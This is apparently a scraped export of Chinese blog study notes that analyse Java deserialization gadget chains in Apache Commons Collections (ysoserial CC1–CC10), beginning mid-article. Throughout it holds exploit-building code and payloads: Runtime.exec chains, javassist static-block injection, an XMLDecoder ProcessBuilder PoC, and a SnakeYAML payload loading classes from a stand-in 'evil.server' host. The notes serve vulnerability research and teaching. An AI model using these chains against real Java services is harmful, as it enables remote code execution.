org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() -&gt; org.apache.commons.collections.map.LazyMap.get() -&gt; org.apache.commons.collections.functors.InvokerTransformer.transform() -&gt; java.lang.reflect.Method.invoke() ... templates gadgets ... -&gt; java.lang.Runtime.exec() 0x05 总结在经过对CommonsCollections系列的利用链进行分析后，在shiro这个问题上，进行了实战，解决了tomcat下无法利用shiro原生的commons-collections:3.2.1这个问题。 最后，在最近的shiro-721利用上，这个利用链希望可以帮助到大家 Happy Hacking XD"},{"title":"【notes】Java反序列化利用链挖掘之CommonsCollections2,4,8","permalink":"http://blog.0kami.cn/2019/11/05/java/study-java-deserialized-commonscollections4/","text":"0x00 前言前面几篇文章，分析了CommonsCollections:3.2.1版本以下存在的反序列化链。今天将继续分析CommonsCollections:4.0版本，主要讲述CommonsCollections2，4，8的利用链构造。 0x01 前景回顾commons-collections:4.0版本其实并没有像3.2.2版本的修复方式一样做拉黑处理，所以在3.2.1及以下的利用链改改还是可以用的。例如CommonsCollections5 12final Map&lt;String, String&gt; innerMap = new HashMap();final Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain); 将innerMap改成键值对的申明方式即可，但是大家是不是还记得，除了用LazyMap的方式，CommonsCollections3曾提到过使用TrAXFilter类初始化的方式来载入任意的class bytes数组。 commons-collections:4.0版本下的利用链，用的都是TemplatesImpl作为最终的命令执行的代码调用，由于前面分析过这个利用方式，后文不再复述。 0x02 利用链分析1. CommonsCollections2,4CommonsCollections2,4都用到了一个新的类PriorityQueue的Comparator来触发transform函数，两者的区别在于中间的桥接用的不同的Transformer对象。先来看一下PriorityQueue.readObject 框框里的主要工作为反序列化恢复该对象的数据，我们重点关注heapify() 继续跟进siftDown 当我们在实例化对象时提供了comparator，将会来到我们最终触发compare的位置，看一下siftDownUsingComparator 这里调用了我们传入的comparator，并调用其compare，利用链中使用了TransformingComparator,来看一下它的compare函数 调用了当前的transformer的transform函数，看到这里，其实已经很熟了，前面分析的很多利用链都跟transform有关，并且4.0版本并没有拉黑相关的transformer。所以接下来，我们就可以用前面的一些思路了。 CommonsCollections2 CommonsCollections2利用了InvokerTransformer类的任意类函数调用的transform，传入构造好的templates gadget并调用 TemplatesImpl.newTransformer CommonsCollections4 CommonsCollections4后续用的方法同CommonsCollections3一样，用InstantiateTransformer来触发TrAXFilter的初始化，最终也将调用TemplatesImpl.newTransformer 整理一下利用链 12345678910111213141516171819202122CommonsCollection2:PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec()CommonsCollection4:PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; ChainedTransformer.transform() -&gt; InstantiateTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() 2.CommonsCollections8CommonsCollections8是今年navalorenzo推送到ysoserial上的，8与2，4的区别在于使用了新的readObject触发点TreeBag 来看一下TreeBag.readObject 这里的两个关键点TreeBag的父类的doReadObject函数和TreeMap. 看一下doReadObject 这里对传入的TreeMap调用了put函数 继续跟进compare函数 这里又回到了熟悉的comparator.compare函数，其中comparator就是我们构造的TransformingComparator 后续跟CommonsCollections2相同，就不复述了。 整理一下利用链 12345678TreeBag.readObject() -&gt; AbstractMapBag.doReadObject() -&gt; TreeMap.put() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() 3. commons-collections:4.1及以上的改变前面提到的CommonsCollections2,4,8，都是在commons-collections:4.0版本下才可以使用的。这里我们来看看为什么在4.1及以上版本无法利用！ 前面我们用到了InvokerTransformer和InstantiateTransformer作为中转，很真实，4.1版本这两个类都没有实现Serializable接口，导致我们在序列化时就无法利用这两个类。emmmmm，直接干掉了上面的2，4，8。 这个改变意味着我们需要从其他可操作危险方法的对象了。 0x03 总结分析完ysoserial里的commons-collections系列的payloads，我们可以简单总结一下Java的反序列化挖掘思路（不涉及技术点，个人的一些想法）。 1. 最终的利用效果在利用链构造中，我们肯定希望最终可以达到任意命令执行或者是任意代码执行的效果，这样会使得反序列化漏洞的威力最大化。所以我们很开心能看到InvokerTransformer的transform函数，他利用反射机制来调用任意的代码，也意味着我们能控制任意类的调用执行。但是在实际的挖掘中，除了对反射机制的挖掘和defineClass类型的挖掘，我们也应该注意到其他可能会存在的危险利用，如任意文件写入，任意文件删除等等。 2. 利用链总体的一个挖掘思路我们在分析完所有的CommonsCollections的payloads很容易发现的一点是很多payloads“杂交”组合了多个可利用的节点。那么我们在实际的挖掘中，我们需要首先能获知哪些库文件里有哪些可利用的节点，然后根据一定的规则来进行一个链条的连接。 那么来看一下，可利用的节点是什么？ 实现了Serializable接口，枚举出所有可以被序列化的类。 该类的类属性做了函数调用或函数的返回值，如TreeMap.map.put()和ConstantTransformer.transform直接返回iConstant类属性。如果不存在上述的情况，我们可以忽略。 实现了readObject函数，这种情况可作为起始点，也可以作为桥接点，需要具体判断其代码的实现。 实现了invoke函数，这种情况可作为桥接点，利用了代理机制。 从readObject函数和invoke函数，衍生出来的类属性函数调用，这边可能会引向其他的类函数，如TreeBag.readObject的实现，将引向下一步的父类函数doReadObject函数。这里就需要做一个人工或者是静态的代码分析。 接下来，关于可利用节点的串联，其实主要依赖于第5点的挖掘，我们需要根据经验或者是静态的代码分析来做。 根据上面的一个分析，其实我们可以做到一个自动化的利用链发掘，https://github.com/JackOfMostTrades/gadgetinspector 这个工具就是一个很好的实现，后续将对其进行一个分析。 从commons-collections的防护来看，我们越来越无法在单个库里面实现一个可利用的利用链，这也意味着我们需要对不同的项目做针对性的分析，所以gadetinspector这个工具的重要性就不言而喻了。下一步将重点分析一下该工具的实现。"},{"title":"【notes】Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10","permalink":"http://blog.0kami.cn/2019/10/31/java/study-java-deserialized-commonscollections3-others/","text":"0x00 前言本文继续分析CommonsCollections的相关反序列化利用链，这次主要分析CommonsCollections5,6,7，以及我找的一个新利用链，这里暂且将其称为10. 0x01 环境准备 jdk8，commons-collections:3.1 123java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 \"open /System/Applications/Calculator.app\" &gt; commonscollections5.serjava -jar ysoserial-master-30099844c6-1.jar CommonsCollections6 \"open /System/Applications/Calculator.app\" &gt; commonscollections6.serjava -jar ysoserial-master-30099844c6-1.jar CommonsCollections7 \"open /System/Applications/Calculator.app\" &gt; commonscollections7.ser 0x02 利用链分析 1. 背景回顾前面提到过CommonsCollections1和3在构造AnnotationInvocationHandler时用到了Override.class。但是如果你在jdk8的环境下去载入生成的payload，会发生java.lang.Override missing element entrySet的错误。 这个错误的产生原因主要在于jdk8更新了AnnotationInvocationHandler参考 jdk8不直接调用s.defaultReadObject来填充当前的AnnotaionInvocationHandler实例，而选择了单独填充新的变量。 这里我们回顾一下，1和3的payload的触发点是LazyMap.get函数，而触发这个函数需要使得memberValues为LazyMap对象 显然，jdk8的操作使得memberValues并不是我们构造好的LazyMap类型。在调试中，可以看到此时的memberValues为LinkedHashMap对象，该对象无法获得entrySet的内容，所以会报前面的这个错误。 jdk8下CommonsCollections1和3无法成功利用了，但是如果我们可以找到一个替代AnnotationInvocationHandler的利用方式呢？这就是本文要讲的CommonsCollections5，6，7所做出的改变。 2. 重新构造前半部分利用链–CommonsCollections5CommonsCollections5与1的区别在于AnnotationInvocationHandler，后部分是相同的，所以这里不分析后部分。 AnnotationInvocationHandler在前面起到的作用是来触发LazyMap.get函数，所以我们接下来就是要重新找一个可以触发该函数的对象。这个对象满足 类可序列化，类属性有个可控的Map对象或Object 该类的类函数上有调用这个Map.get的地方 CommonsCollections5在这里用到了TiedMapEntry，来看一下 TiedMapEntry有一个map类属性，且在getValue处调用了map.get函数。同时toString、hashCode、equals均调用了getValue函数，这里关注toString函数。 toString函数通常在与字符串拼接时，会被自动调用。那么接下来我们需要找一个对象满足 类可序列化，类属性有个Map.Entry对象或Object 该类会自动调用这个类属性的toString函数或前面的另外几种 这里选择了BadAttributeValueExpException对象，他的readObject函数会自动调用类属性的toString函数。 需要注意的是这里System.getSecurityManager为空，换句话说，就是当前的jvm环境不能启用安全管理器。 来看一下一整个调用链 12345BadAttributeValueExpException.readObject() -&gt; valObj.toString() =&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; 前文构造的Runtime.getRuntime().exec() 3. 重新构造前半部分利用链–CommonsCollections6CommonsCollections6是另一种替换方式，后半部分的利用链还是没有变，不作分析。 我们在2中提到了除了CommonsCollections5用的toString外，还有hashCode和equals函数也调用了getValue函数。那么是否存在调用这两个函数的对象函数呢？答案是肯定的！ CommonsCollections6利用了TiedMapEntry的hashCode函数，来触发LazyMap.get 我们都知道HashSet集合里不会存在相同的key，那么是如何判断是否是相同的key呢？这里就要用到key的hashCode函数了，如果key的值相同，其hashCode返回的值也是相同的。这里的HashCode的计算在HashSet的put和add函数完成，并且HashSet从序列化数据中还原出来时会自动调用put函数，这里就给我们提供了可控的地方。 先来看一下HashSet的readObject函数 继续跟put函数，这里其实调用的是HashMap的put函数 其中对key调用的hash()函数会调用key.hashCode函数，那么现在就很清楚了，我们只要将key的值替换成构造好的TiedMapEntry对象就可以了。注意，这里的key值其实就是HashSet.add的实例，在HashSet里的HashMap类属性只用到了Key。 整理一下利用链 123456HashSet.readObject() -&gt; HashMap.put(key) =&gt; key.hashCode =&gt; TiedMapEntry.hashCode -&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; 前文构造的Runtime.getRuntime().exec() 4. 重新构造前半部分利用链–CommonsCollections7CommonsCollections7用了Hashtable来代替AnnotationInvocationHandler，不同于前面两种CommonsCollections7并未使用TiredMapEntry，而是用了相同key冲突的方式调用equals来触发Lazy.get函数。 先来看一下Hashtable的readObject函数 继续跟进reconstitutionPut 该函数将填充table的内容，其中第1236行仅当有重复数据冲突时，才会进入下面的if语句，这里我们继续跟进equals函数 这里的equals函数取决于key的对象，利用链用的是LazyMap对象，实际调用的是父类AbstractMapDecorator的equals函数 这里又调用了map的equals函数，这里实际调用的是HashMap的父类AbstractMap的equals函数 在第495行调用了m.get函数，所以后面又是我们熟悉的LazyMap.get的套路了。 整理一下利用链 123456Hashtable.readObject() -&gt; Hashtable.reconstitutionPut -&gt; LazyMap.equals =&gt; AbstractMapDecorator.equals =&gt; AbstractMap.equals -&gt; m.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; 前文构造的Runtime.getRuntime().exec() 5. 利用链构造CommonsCollections6和7的exp构造比较复杂，这里单独拿出来讲一下。 CommonsCollections6经过前面的分析，我们可以知道CommonsCollections6需要将构造好的TiedMapEntry实例添加到HashSet的值上。 简单的方法就是直接add 123TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");HashSet map = new HashSet(1);map.add(entry); 复杂一点，就是ysoserail里的实现方法，采用反射机制来完成 其思路主要为： 实例化一个HashSet实例 通过反射机制获取HashSet的map类属性 通过反射机制获取HashMap(map类属性)的table(Node&lt;K,V&gt;)类属性 通过反射机制获取Node的key类属性，并设置该key的值为构造好的TiedMapEntry实例 具体代码如下 12345678910111213141516171819202122232425262728293031323334HashSet map = new HashSet(1);map.add(\"foo\");Field f = null;try &#123; f = HashSet.class.getDeclaredField(\"map\");//获取HashSet的map Field对象&#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(\"backingMap\");&#125;Permit.setAccessible(f);// 设置map可被访问修改HashMap innimpl = null;innimpl = (HashMap) f.get(map);// 获取map实例的map类属性Field f2 = null;try &#123; f2 = HashMap.class.getDeclaredField(\"table\");// 获取HashMap的 table field&#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(\"elementData\");&#125;Permit.setAccessible(f2);// 设置HashMap的field 可被访问Object[] array = new Object[0];array = (Object[]) f2.get(innimpl);Object node = array[0];// 获取Node&lt;k,v&gt;实例if(node == null)&#123; node = array[1];&#125;Field keyField = null;try&#123; keyField = node.getClass().getDeclaredField(\"key\");// 获取Node的key field&#125;catch(Exception e)&#123; keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");&#125;Permit.setAccessible(keyField);// 设置该Field可被访问修改keyField.set(node, entry);// 对node实例填充key的值为TiedMapEntry实例 经过上面的操作，最终的HashSet实例被我们嵌入了构造好的TiedMapEntry实例。 这里在调试的过程中，发现用ysoserail的Reflections来简化exp，出来的结果有点不一样，还没有找到具体的原因。如果有师傅遇到过这种问题，欢迎一起讨论讨论！ CommonsCollections7CommonsCollections利用的是key的hash冲突的方法来触发equals函数，该函数会调用LazyMap.get函数 那么构造exp的关键就是构造一个hash冲突的LazyMap了。 这里大家可以跟一下String.hashCode函数，他的计算方法存在不同字符串相同hash的可能性，例如如下代码 CommonsCollections7用的就是这个bug来制造hash冲突。 这里需要提一点的是触发LazyMap.get函数 要走到第151行红框框上，首先需要满足的是map里不存在当前这个key 但是明显在第一次不存在这个key后，会更新map的键值，这将导致下次同样的key进来，就不会触发后续的payload了。我们在写exp的时候需要注意到这一点。 来看一下ysoserial的CommonsCollections7是怎么编写的！ 123456789101112131415161718Map innerMap1 = new HashMap();Map innerMap2 = new HashMap();// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObjectMap lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);lazyMap1.put(\"yy\", 1);Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);lazyMap2.put(\"zZ\", 1);// Use the colliding Maps as keys in HashtableHashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 2);Reflections.setFieldValue(transformerChain, \"iTransformers\", transformers);// Needed to ensure hash collision after previous manipulationslazyMap2.remove(\"yy\"); 其中第两次的put会使得会使得LazyMap2中增加了yy这个键值，为了保证反序列化后仍然可以触发后续的利用链，这里需要将lazyMap2的yy键值remove掉。 6. 构造新CommonsCollections10经过对前面1,3,5,6,7的分析，我们其实可以发现很多payload都是“杂交”的成果。那么我们是否能根据前面的分析，构造出一个新的CommonsCollections的payload呢？答案当然是肯定的，接下来讲一下我找到的一个新payload利用。 这个payload为CommonsCollections6和7的结合，同CommonsCollections6类似，这里也用到了TiedMapEntry的hashCode函数 我们在分析Hashtable的reconstitutionPut函数时，看下图 该函数在第1234行对key调用了一次hashCode函数，那么很明显，如果key值被代替为构造好的TiedMapEntry实例，这里我们就能触发LazyMap.get函数，后续的调用链就类似了。 整理一下利用链 1234567Hashtable.readObject() -&gt; Hashtable.reconstitutionPut -&gt; key.hashCode() =&gt; TiedMapEntry.hashCode() -&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; 前文构造的Runtime.getRuntime().exec() 其实从利用链来看，与CommonsCollections6的区别在于前部的触发使用了不同的对象。 接下来，结合第5点的学习，我们来写一下这个payload的利用链exp 12345678910111213141516171819202122232425final Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);final Map innerMap = new HashMap();final Map innerMap2 = new HashMap();final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");Hashtable hashtable = new Hashtable();hashtable.put(\"foo\",1);// 获取hashtable的table类属性Field tableField = Hashtable.class.getDeclaredField(\"table\");Permit.setAccessible(tableField);Object[] table = (Object[])tableField.get(hashtable);Object entry1 = table[0];if(entry1==null) entry1 = table[1];// 获取Hashtable.Entry的key属性Field keyField = entry1.getClass().getDeclaredField(\"key\");Permit.setAccessible(keyField);// 将key属性给替换成构造好的TiedMapEntry实例keyField.set(entry1, entry);// 填充真正的命令执行代码Reflections.setFieldValue(transformerChain, \"iTransformers\", transformers);return hashtable; 7. 梅子酒师傅的CommonsCollections9找到上面CommonsCollections10时，在网上找了一下有没有师傅已经挖到过了，一共找到下面三位师傅 https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d https://github.com/frohoff/ysoserial/pull/116 一个一个来说 第一个Jayl1n师傅做的改变主要是最终的Runtime.getRuntime().exec改成了URLClassLoader.loadClass().newInstance的方式，前面用的还是CommonsCollections6，这里暂时不将其归类为新的利用链。 第二个是梅子酒师傅提交的CommonsCollections9，主要利用的是CommonsCollections:3.2版本新增的DefaultedMap来代替LazyMap，因为这两个Map有同样的get函数可以被利用，这里不再具体分析。 第三个是navalorenzo师傅提交的CommonsCollections8，其利用链基于CommonsCollections:4.0版本，暂时不在本篇文章的分析范围内，后面会好好分析一下。 0x03 总结联合前面两篇文章CommonsCollections1、CommonsCollections3，在加上本文的CommonsCollections5，6，7，9，10。 由于网上已经有类似的文章做了总结，这里就简单做一下CommonsCollections&lt;=3.2.1下的反序列化利用链的总结。 起始点 AnnotationInvocationHandler的readObject BadAttributeValueExpException的readObject HashSet的readObject Hashtable的readObject 重要的承接点 LazyMap的get DefaultedMap的get TiedMapEntry的getValue Proxy的invoke 终点 ChainedTransformer的transform InvokerTransformer的transform ConstantTransformer的transform 各exp的jdk适用版本 jdk7 =&gt; CommonsCollection1、3 jdk7 &amp; jdk8 =&gt; CommonsCollections5,6,7,9,10 各exp的commons-collections适用版本 commons-collections&lt;=3.1 CommonsCollections1,3,5,6,7,10 commons-collections&lt;=3.2.1 CommonsCollections1,3,5,6,7,9,10 最后的最后，commons-collections:3.x版本的反序列化利用链就分析到这里，其实我相信如果想继续挖可代替的利用链还是会有的，就像本文挖到的CommonsCollections10，如果各位师傅有兴趣可以继续挖下去，也欢迎和各位师傅一起交流。 后续还会把commons-collections:4版本的利用链做一个分析，欢迎一起交流：）"},{"title":"【notes】Java反序列化利用链挖掘之CommonsCollections3","permalink":"http://blog.0kami.cn/2019/10/28/java/study-java-deserialized-commonscollections3-3/","text":"0x00 前言前面分析了ysoserial的CommonsCollections1，熟悉了一点Java反序列化。本文将继续分析ysoserial的利用，今天的主角是CommonsCollections3. 0x01 环境准备首先由于override的原因，环境使用的是jdk7u80。利用ysoserial生成payload，并载入调试。 1java -jar ysoserial-master-30099844c6-1.jar CommonsCollections3 \"open /System/Applications/Calculator.app\" &gt; commonscollections3.ser 0x02 基础知识在分析开始前，先补充一下基础知识 12public class StaticBlockTest &#123;&#125; 12345678910111213141516171819202122public class Cracker &#123; public static byte[] generate()&#123; try &#123; String code = \"&#123;java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");&#125;\"; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(StaticBlockTest.class.getName()); clazz.setName(\"demo\"); clazz.makeClassInitializer().insertAfter(code); return clazz.toBytecode(); // ... &#125; public static void main(String[] args) &#123; byte[] clazz = generate(); DefiningClassLoader loader = new DefiningClassLoader(); Class cls = loader.defineClass(\"demo\",clazz);// 从字节数组中恢复类 try &#123; cls.newInstance(); // 实例化该类时会自动调用静态块内的代码 &#125; // ... &#125;&#125; 通过上面这个例子，我们可以获得的知识点主要为两点： ​ a. defineClass可以从byte数组中恢复一个Class ​ b. static initializer在类载入时将自动执行（静态块内的代码） Java中动态调用的另一种方式是defineClass Java提供了ClassLoader从bytes数组中还原Class的方法，defineClass函数就是完成这一过程的函数。 理论上，如果代码中使用了这种方式，且byte数据的内容可控，我们可以执行任意Java代码。为什么呢？ 这里就用到了Java类的另一个特性，static block在类载入时自动执行块内的代码。我们可以通过javassist对静态块注入任意代码，该类被恢复并载入时会调用注入的代码，后文的利用链主要就是用到了这两个知识点。 0x03 利用链分析1. 前景回顾这里选择CommonsCollections3是因为他的前半段触发的利用链跟CommonsCollections1是一样的，所以这里只需要分析后半段命令执行的构造即可。回顾一下前半段利用链 123456sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValues.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; memberValues.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; iTransformers[].transform() CommonsCollections1中ChainedTransformer.transform()会循环调用iTransformers数组里的对象的transform函数。CommonsCollections1用的是InvokerTransformer的transform，因为该函数实现了反射调用任意类的功能。那么除了使用InvokerTransformer还有没有其他的方法？答案当然是肯定的！ 2. 新的命令执行利用链来看一下CommonsCollections3的payloads构造 123456789Object templatesImpl = Gadgets.createTemplatesImpl(command);// real chain for after setupfinal Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] &#123; Templates.class &#125;, new Object[] &#123; templatesImpl &#125; )&#125;;// 后续类似 省略 ConstantTransformer上一篇已经说过了，其transform会返回构造时的对象，这里就是TrAXFilter.class对象。 我们重点来看InstaniateTransformer的transform函数 简单来看，该函数对输入的input（这里就是TrAXFilter.class）做实例化的操作。这里看起来，其实有点像php中找对应的__constructs，在Java里我们就去找构造函数里做了危险操作的class。 来看一下TrAXFilter类的构造函数 这里的templates就是上面exp中构造的templatesImpl. 继续看TransformerImpl的newTransformer函数 org.apache.xalan.internal.xsltc.trax.TemplatesImpl.java:newTransformer:481 继续看getTransletInstance 再继续defineTransletClasses 看到这里是不是有点熟悉，没错，这里用到了0x02中的两个基础知识。defineTransletClasses还原出类，getTransletInstance进行实例化。那么我们只需要构造一个合适的_bytecodes即可执行任意Java代码。 下面补充一下，在构造exp时需要满足的条件： 植入的templates为TransformerImpl类，从而调用后续的newTransformer函数 植入的templates实例，_name不为null,_class为null 植入的templates实例，_bytecodes不为null,_tfactory为TransformerFactoryImpl对象 植入的templates._bytecodes数组，其最终还原的对象父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 那么怎么才能满足这些条件呢？这里神奇的javassist又要上场啦！ 来看一下ysoserial的操作 上面的代码不做省略，我们应该好好学习一下javassist的基本操作，代码可以在Gadgets.createTemplatesImpl找到！ 这里框了两个框，第一个框是通过javassist注入静态块，静态块的内容就是我们需要执行的命令。第二个框是ysoserail框架自己封装的一个反射工具类，通过这个类我们可以动态的操作templates实例的类属性内容。这里主要就是在满足上述的几个条件。 这里有一点可以提一下，该利用链的作者在填充_bytecodes时，额外填充了一个无关的类(上图第130行)。这个类主要用于满足_auxClasses,让这个getTransletInstance函数能正常走完。 经过上面的分析，其实我们可以知道getTransletInstance的第408行，对_class做实例化时我们想要执行的代码就已经执行了。所以这里额外填充的类其实是可有可无的。 0x04 总结到这里，整一个CommonsCollections3就分析结束了。 CommonsCollections3主要利用了可控的byte数组从defineClass函数中还原出恶意构造的Class。并且在后续的调用中，这个Class被注入到内存中，从而执行了注入的静态块的代码，实现了任意Java代码执行。 到这篇为止，我们已经知道了两种Java的任意代码执行的构造方式 利用可控的反射机制。具体的Class、Method等均可控时，利用反射机制，可以构造出任意的类调用、类函数调用 利用可控的defineClass函数的byte数组。构造恶意的Class字节码数组，常于静态块注入恶意代码 20191104 补充前面的分析并没有提到3.2.2版本发生了啥事，导致了利用链的失效，这里简单提一下 3.2.2版本对InvokerTransformer增加了readObject函数，并且做了是否允许反序列化的检查，在FunctorUtils.checkUnsafeSerialization函数内。 这里UNSAFE_SERIALIZABLE_PROPERTY的值默认为false，如果需要为true，需要在运行时指定。 所以在使用InvokerTransformer作为反序列化利用链的一部分时，会throw一个exception。除了InvokerTransformer类外，还有CloneTransformer, ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer,PrototypeCloneFactory, PrototypeSerializationFactory, WhileClosure。所以在3.2.2版本以上，基本上利用链都已经废了。 当然，这种方法治标不治本，如果可以在这些类以外，构造一个利用链同样可以达到前面的效果。"},{"title":"【notes】Java反序列化利用链挖掘之CommonsCollections1","permalink":"http://blog.0kami.cn/2019/10/24/java/study-java-deserialized-commonscollections3-1/","text":"0x00 前言 前段时间在复现shiro反序列化漏洞的过程中，发现无法很好的理解CommonCollections4为什么无法执行命令，还是缺少Java的一些基础知识。所以这里就先停下了复现漏洞的进程，先将基础打扎实：）。这篇文章将记录，Java反序列化漏洞的原理以及测试环境。 参考文献都嵌入在文中。 0x01 基础知识1. Java中的序列化和反序列化序列化：使用ObjectOutputStream类的writeObject函数 1public final void writeObject(Object x) throws IOException 反序列化：使用ObjectInputStream类的readObject函数 1public final Object readObject() throws IOException, ClassNotFoundException 支持序列化的对象必须满足： 实现了java.io.Serializable接口 当前对象的所有类属性可序列化，如果有一个属性不想或不能被序列化，则需要指定transient，使得该属性将不会被序列化 举个例子(来源于此处) 123456789101112public class Employee implements java.io.Serializable&#123; public String name; public String address; public transient int SSN; public int number; public void mailCheck() &#123; System.out.println(\"Mailing a check to \" + name + \" \" + address); &#125;&#125; 1234567891011121314151617181920212223242526import java.io.*;public class SerializeDemo&#123; public static void main(String [] args) &#123; Employee e = new Employee(); e.name = \"Reyan Ali\"; e.address = \"Phokka Kuan, Ambehta Peer\"; e.SSN = 11122333; e.number = 101; try &#123; FileOutputStream fileOut = new FileOutputStream(\"/tmp/employee.ser\"); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(e); out.close(); fileOut.close(); System.out.printf(\"Serialized data is saved in /tmp/employee.ser\"); &#125;catch(IOException i) &#123; i.printStackTrace(); &#125; &#125;&#125; 运行后，生成employee.ser 根据序列化规范，aced代表java序列化数据的magic wordSTREAM_MAGIC,0005表示版本号STREAM_VERSION,73表示是一个对象TC_OBJECT,72表示这个对象的描述TC_CLASSDESC 所以在日常测试中，如果解开类似Base64后，起始为aced打头，可以尝试使用反序列化的payload。 在对其做完序列化操作后，我们在另一个JVM中恢复该对象，需要用到ObjectInputStream 12345678910111213141516171819202122232425262728293031import java.io.*;public class DeserializeDemo&#123; public static void main(String [] args) &#123; Employee e = null; try &#123; FileInputStream fileIn = new FileInputStream(\"/tmp/employee.ser\"); ObjectInputStream in = new ObjectInputStream(fileIn); e = (Employee) in.readObject(); in.close(); fileIn.close(); &#125;catch(IOException i) &#123; i.printStackTrace(); return; &#125;catch(ClassNotFoundException c) &#123; System.out.println(\"Employee class not found\"); c.printStackTrace(); return; &#125; System.out.println(\"Deserialized Employee...\"); System.out.println(\"Name: \" + e.name); System.out.println(\"Address: \" + e.address); System.out.println(\"SSN: \" + e.SSN); System.out.println(\"Number: \" + e.number); &#125;&#125; readObject函数反序列化了上面产生的二进制数据流，生成了原有的对象数据结构。需要注意的是，由于SSN为transient，其无法序列化，所以还原后其值为0。 如果在待序列化类上实现了readObject函数，反序列化过程中会自动调用该类的readObject函数。 例如在Employee类中添加函数readObject 1234private void readObject(ObjectInputStream in) throws Exception &#123; in.defaultReadObject(); System.out.println(\"Employee call readObject Function\");&#125; 在反序列化过程中将调用该函数 2. 反序列化触发点扩展上面展示了序列化和反序列化的原理，并且反序列化的触发点为ObjectInputStream.readObject。那么问题来了，是否Java反序列化只能由该点触发？答案当然是否定的。 除了上面的方法外，还有如下几种触发方式： 1234567ObjectInputStream.readObject// 流转化为ObjectObjectInputStream.readUnshared // 流转化为ObjectXMLDecoder.readObject // 读取xml转化为ObjectYaml.load// yaml字符串转ObjectXStream.fromXML// XStream用于Java Object与xml相互转化ObjectMapper.readValue// jackson中的apiJSON.parseObject// fastjson中的api Note: 对于readUnshared函数，其与readObject函数的区别暂时还没弄明白，引用网上的解释 readUnshared方法读取对象，不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。 但其反序列化过程中仍然可以触发readObject的调用，有待弄清楚。 3. 扩展触发点试验readUnshared函数的使用方式同readObject类似，这里不再叙述。这一小节主要讲各种触发点的利用方式，不讲具体的原理。原理部分留到后面分析。 a. XMLDecoder.readObject1234567891011public static void main(String[] args)&#123; String poc = \"poc.xml\"; try &#123; FileInputStream file = new FileInputStream(poc); XMLDecoder decoder = new XMLDecoder(file); decoder.readObject(); decoder.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125;&#125; poc.xml 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;java&gt; &lt;object class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/sh&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;open /Applications/Calculator.app&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt; &lt;/object&gt;&lt;/java&gt; 最终可触发命令执行 b. Yaml.load参考链接，这里暂未试验 添加SnakeYAML库 123456&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;&lt;dependency&gt; &lt;groupId&gt;org.yaml&lt;/groupId&gt; &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt; &lt;version&gt;1.25&lt;/version&gt;&lt;/dependency&gt; 123456public static void main(String[] args) &#123; String yamlStr = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \" + \"[[!!java.net.URL [\\\"http://evil.server\\\"]]]]\"; Yaml yaml = new Yaml(); Object obj = yaml.load(yamlStr);&#125; 